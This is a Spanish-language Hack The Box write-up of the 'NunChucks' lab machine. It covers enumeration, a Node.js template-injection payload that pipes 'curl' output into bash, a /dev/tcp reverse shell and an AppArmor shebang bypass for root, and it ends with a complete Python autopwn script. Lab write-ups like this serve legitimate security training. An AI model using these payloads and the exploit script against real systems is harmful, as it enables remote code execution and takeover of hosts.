---
title: NunChucks HTB Write-up
categories: [Write up, Hack The Box]
tags: [Enumeration, Web, SSTI, AppArmor bypass, Autopwn, Linux, Easy]
pin: false
math: true
mermaid: true
---

<img src="/imagenes/NunChucks/Nunchucks_banner.png"  width="550" height="250">


## Resumen

Saludos, en esta oportunidad vamos a resolver la máquina de **Hack The Box** llamada **NunChucks**, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:

*  **Enumeración del sistema y subdominios.**
*  **SSTI.**
*  **AppArmor Bypass (Shebang).**
*  **Automatización de la intrusión.**


## Reconocimiento y Enumeración

En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando `ping`:

```
ping -c 1 10.10.11.122

PING 10.10.11.122 (10.10.11.122) 56(84) bytes of data.
64 bytes from 10.10.11.122: icmp_seq=1 ttl=63 time=143 ms
```
Se observa que existe una correcta conexión con la máquina.

Para realizar un reconocimiento activo se utilizará la herramienta `nmap`, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro `-sS` el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):

```
sudo nmap -p- -sS --open -min-rate 5000 10.10.10.239 -oG Port
```
Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima: 
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```
Realizamos un escaneo de los servicios expuestos utilizando `nmap`:

```
sudo nmap -sCV -p22,80,443 10.10.11.122 -oN ServiceScan
```

Como resultado del escaneo tenemos:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Observamos **http** y **https**, utilizaremos `whatweb` para enumerar información:
```
whatweb 10.10.11.122

http://10.10.11.122 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]
ERROR Opening: https://nunchucks.htb/ - no address for nunchucks.htb
```

Observamos que existe el dominio nunchucks.htb, lo agregaremos al /etc/hosts en caso de que se esté realizando virtual hosting.
```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.122    nunchucks.htb
```

Haciendo posible ahora la comunicación. 
```
whatweb 10.10.11.122

http://10.10.11.122 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]

https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]
```
Observamos ahora más información de la página, vamos a entrar utilizando el navegador:

![](/imagenes/NunChucks/nun1.png)

Es una página estática, sin embargo, tiene una sección de login

![](/imagenes/NunChucks/nun2.png)


Sin embargo, no funciona. La de registro tampoco funciona, lo que nos hace pensar que quizas no es por aqui. si realizamos fuzzing no encontraremos nada interesante en este punto. Por lo tanto, buscaremos posibles subdominios:

```
wfuzz -c --hc=404,403 --hh=30587 -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.nunchucks.htb" -t 200 https://nunchucks.htb

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store" 
```
Ocultando el codigo 404 y el largo de 30587, pues esta página tenía gran cantidad de direcciones que no llevaban a ningún lado.

Tenemos entonces un subdominio llamado store, vamos a revisarlo:

![](/imagenes/NunChucks/nun3.png)

Tenemos una sección para enviar algo, vamos a probarla:

![](/imagenes/NunChucks/nun4.png)

## Explotación

Observamos que en la respuesta **You will receive updates on the following email address: test@test.com.** está nuestro imput, quiere decir que al menos si se está realizando la petición, utilizaremos `Burpsuite` para analizar:


![](/imagenes/NunChucks/nun5.png)

Observamos que nuestro imput se reconoce allá, si probamos diferentes injecciones nos daremos cuenta que al parecer no es vulnerable, hasta que intentamos con SSTI, si vamos a la página de [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), encontraremos varias formas de probar SSTI, probaremos con la primera:

![](/imagenes/NunChucks/nun6.png)

Observamos que el resultado es 49, lo que hace vulnerable a SSTI al sitio, ahora tenemos que identificar a qué tipo pertenece.

Si provocamos un error vemos lo siguiente:

![](/imagenes/NunChucks/nun7.png)

Observamos **/var/www/store.nunchucks/node_modules/** lo que nos dice que se trata de un servidor utilizando node.js.

Otra forma puede ser utilizando wappalyzer:

![](/imagenes/NunChucks/nun8.png)

Bien, si filtramos por node.js en la web de HackTricks encontramos diversos, pero hay uno que tiene un nombre particular y si probamos cada uno de los test darán todos como debería:

![](/imagenes/NunChucks/nun9.png)

Vamos a intentar utilizar el primer **payload**:

![](/imagenes/NunChucks/nun10.png)

Utilizando backslash escapamos las comillas dobles y al enviarlo vemos que ha listado correctamente el archivo **/etc/passwd**, por lo tanto, ahora solo falta ganar acceso.

Para ello utilizaremos el siguiente comando (va en doble llave):

```
range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.14.17 | bash')\")()
```
Haremos una petición a nuestro servidor http, el cual estará compartiendo este archivo index.html:
```
#!/bin/bash bash -i >& /dev/tcp/10.10.14.17/1235 0>&1 
```

Y a su vez, estaremos escuchando con `netcat` por el puerto 1235, si mandamos la información:

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.122 - - [12/Feb/2023 01:13:05] "GET / HTTP/1.1" 200 -
```
Y en el `netcat`:
```
nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.122] 43250
bash: cannot set terminal process group (1005): Inappropriate ioctl for device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ 
```

¡Bien!, estamos dentro de la máquina, buscamos la flag:
```
david@nunchucks:~$ cat user.txt
cat user.txt
e707026421f7744f3c6c7a7a6
```

Excelente ahora toca escalar privilegios.

## Escalada de privilegios
```
david@nunchucks:~$ id
uid=1000(david) gid=1000(david) groups=1000(david)
david@nunchucks:~$ sudo -l
[sudo] password for david: 
Sorry, try again.
[sudo] password for david: 
sudo: 1 incorrect password attempt
david@nunchucks:~$ netstat -nat

Command 'netstat' not found, but can be installed with:

apt install net-tools
Please ask your administrator.
```

No podemos ver los privilegios porque no tenemos la contraseña. 

Si buscamos por SUID encontramos cosas:
```
david@nunchucks:~$ find / -perm -4000 2>/dev/null
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/su
/usr/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```
Sin embargo, no utilizaremos `pkexec` para escalar privilegios.

Podríamos ver las capabilities:
```
david@nunchucks:~$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

david@nunchucks:~$ 
```

Observamos la capabilitie setuid para perl, buscamos en gtfobins para ver si hay posibilidad de escalar privilegios:

![](/imagenes/NunChucks/nun11.png)

Vemos una forma de ejecutar comandos de forma privilegiada con esto:
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Vamos a intentarlo:
```
david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Sin embargo, no ocurre nada. Si probamos con otro comando:
```
david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
```
En este caso si lo ejecuta.
```
david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "ls /root/";'
ls: cannot open directory '/root/': Permission denied
```
Y ahora no.
```
david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "ls -la /root/root.txt";'
-r-------- 1 root root 33 Feb 14 05:17 /root/root.txt
```
Y ahora si, esto nos hace pensar que de alguna forma hay reglas definidas para qué cosas puedes hacer o puede ver. Si buscamos en la web encontramos que existe, por ejemplo, SELinux, que es un módulo de seguridad para el kernel de linux. Si buscamos algunas variantes de esto encontramos **AppArmor**, el cual funciona como un módulo de seguridad, sin embargo, restringe las capacidades de un programa y permite administrar todo eso. Podría ser que se esté aplicando, vamos a buscar si encontramos algo de eso en la máquina.

```
david@nunchucks:/etc/apparmor$ find / -name *apparmor* 2>/dev/null | grep -vE "var|proc|sys"
/usr/share/doc/apparmor-notify
/usr/share/doc/apparmor
/usr/share/doc/python3-apparmor
/usr/share/doc/libapparmor-perl
/usr/share/doc/apparmor-easyprof
/usr/share/doc/python3-libapparmor
/usr/share/doc/libapparmor1
/usr/share/doc/apparmor-utils
/usr/share/apport/package-hooks/source_apparmor.py
/usr/share/lintian/overrides/apparmor-notify
/usr/share/lintian/overrides/apparmor
/usr/share/lintian/overrides/python3-apparmor
/usr/share/lintian/overrides/libapparmor-perl
/usr/share/lintian/overrides/apparmor-easyprof
/usr/share/lintian/overrides/python3-libapparmor
/usr/share/lintian/overrides/libapparmor1
/usr/share/lintian/overrides/apparmor-utils
/usr/src/linux-headers-5.4.0-86/security/apparmor
/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor
/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor.h
/usr/src/linux-headers-5.4.0-81-generic/include/config/default/security/apparmor.h
/usr/src/linux-headers-5.4.0-86-generic/include/config/security/apparmor
/usr/src/linux-headers-5.4.0-86-generic/include/config/security/apparmor.h
/usr/src/linux-headers-5.4.0-86-generic/include/config/default/security/apparmor.h
/usr/src/linux-headers-5.4.0-81/security/apparmor
/etc/apparmor.d
/etc/apparmor.d/abstractions/apparmor_api
/etc/apparmor.d/tunables/apparmorfs
/etc/xdg/autostart/apparmor-notify.desktop
/etc/apparmor
/etc/rcS.d/S01apparmor
/etc/init.d/apparmor
```

Encontramos cosas sobre apparmor, lo que quiere decir que si se está aplicando en este caso.

Entraremos al /etc/apparmor.d:
```
david@nunchucks:/etc/apparmor$ cd /etc/apparmor.d
david@nunchucks:/etc/apparmor.d$ ls
abstractions  disable  force-complain  local  lsb_release  nvidia_modprobe  sbin.dhclient  tunables  usr.bin.man  usr.bin.perl  usr.sbin.ippusbxd  usr.sbin.mysqld  usr.sbin.rsyslogd  usr.sbin.tcpdump
david@nunchucks:/etc/apparmor.d$ 
```

Podemos que se encuentra el **usr.bin.perl**:
```
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```
Acá podemos ver los permisos que tienen definidos para este binario, en este punto debemos pensar en encontrar una forma de burlar esta seguridad, vamos a buscar algun bug o falla de este sistema por la web, encontramos en la web de [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/apparmor) una forma de bypass de apparmor, la cual es hacer uso del Shebang, que corresponde a las cabeceras en los archivos tipo **!#/bin/bash**, esto quiere decir que podemos ejecutar con perl un archivo si utilizamos la cabecera, y apparmor no nos limitará. Para esto crearemos el siguiente archivo:

```
#!/usr/bin/perl

use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";
```
Llamaremos a este archivo test.sh, si lo ejecutamos:
```
david@nunchucks:~$ ./test.sh
# whoami
root
```

De esta forma burlamos el apparmor y pudimos cambiarnos el uid a 0 y spawnear un shell. Siendo ya root buscamos la flag:
```
 cat root.txt
a275bba6e914afcf25ff7bef2d

```
¡Listo! Nos hemos convertido en administrador.

Antes de terminar, como extra haremos la automatización de la intrusión en python.

Las librerías son las siguientes:
```python
import requests,subprocess,socket
from pwn import *
```
Las variables globales son:
```python
ipHost = sys.argv[1]
nunIP = 'https://store.nunchucks.htb/api/submit'
s = requests.Session()
```
Luego, tenemos la primera función que se encarga de escribir en un archivo llamado index.html, el cual lleva el código para entablar la conexión hacia nuestra máquina:
```python
def html_payload():

    with open("index.html","w") as file:
        Shebang = "#!/bin/bash\n"
        payload =f'bash -i >& /dev/tcp/{ipHost}/1234 0>&1'
        file.write(Shebang)
        file.write(payload)
```
La siguiente funición se encarga de explotar el **SSTI**:
```python
def ssti():
    payload = """ {\{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl %s | bash')\")()}} """ % ipHost
    # el primer backslash del payload no va, es solo para que la sintaxis de md me deje poner el payload.
    post_data = { 
        "email": payload
     }
    print("[+] Explotando el SSTI")
    r = s.post(nunIP,data=post_data,verify=False)
```
La última función corresponde a la del servidor http:

```python
def http_server():

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:
            so.bind(('localhost', 80))
            http_server = subprocess.Popen(["python3", "-m", "http.server", "80"])
    except OSError:
            print("\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor")
```
Finalmente, tenemos el main:

```python
if __name__ == '__main__':

    print("[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts.")
    html_payload()
    sleep(2)   
    http_server()
    threading.Thread(target=ssti, args=()).start()
    shell = listen(1234,timeout=20).wait_for_connection()
    shell.interactive()
```

Acá tenemos las llamadas a las funciones.

El código completo es el siguiente:

```python
import requests,subprocess,socket
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) < 2:
    print(f'[!] Uso: python3 {sys.argv[0]} "Tu IP"\n' )
    sys.exit(1)

ipHost = sys.argv[1]
nunIP = 'https://store.nunchucks.htb/api/submit'
s = requests.Session()

def html_payload():

    with open("index.html","w") as file:
        Shebang = "#!/bin/bash\n"
        payload =f'bash -i >& /dev/tcp/{ipHost}/1234 0>&1'
        file.write(Shebang)
        file.write(payload)

def ssti():
    payload = """ {\{range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl %s | bash')\")()}} """ % ipHost
    # el primer backslash del payload no va, es solo para que la sintaxis de md me deje poner el payload.
    post_data = { 
        "email": payload
     }
    print("[+] Explotando el SSTI")
    r = s.post(nunIP,data=post_data,verify=False)

def http_server():

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:
            so.bind(('localhost', 80))
            http_server = subprocess.Popen(["python3", "-m", "http.server", "80"])
    except OSError:
            print("\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor")


if __name__ == '__main__':

    print("[!] Recuerda agregar el dominio nunchucks.htb y store.nunchucks.htb a tu /etc/hosts.")
    html_payload()
    sleep(2)   
    http_server()
    threading.Thread(target=ssti, args=()).start()
    shell = listen(1234,timeout=20).wait_for_connection()
    shell.interactive()
```
¡Listo!, terminamos la automatización de la intrusión.

Nos vemos, hasta la próxima.
